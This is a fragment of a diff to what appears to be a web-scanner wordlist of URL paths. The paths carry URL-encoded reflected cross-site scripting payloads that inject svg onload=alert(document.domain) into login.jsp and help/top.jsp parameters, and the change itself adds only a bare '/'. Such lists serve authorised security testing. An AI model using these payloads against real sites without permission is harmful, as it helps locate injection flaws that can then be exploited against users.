@@ -986,3 +986,4 @@ request?info=<svg onload=alert(
 /login.jsp?nodeid=hebing%27%3E%3Csvg%20onload=alert(document.domain)%3E
 /help/top.jsp?langcode=1%22%3E%3Csvg%20onload=alert(document.domain)%3E
 /help/top.jsp?langcode=1%22%3E%3C/script%3E%3Csvg%20onload=alert(document.domain)%3E
+/
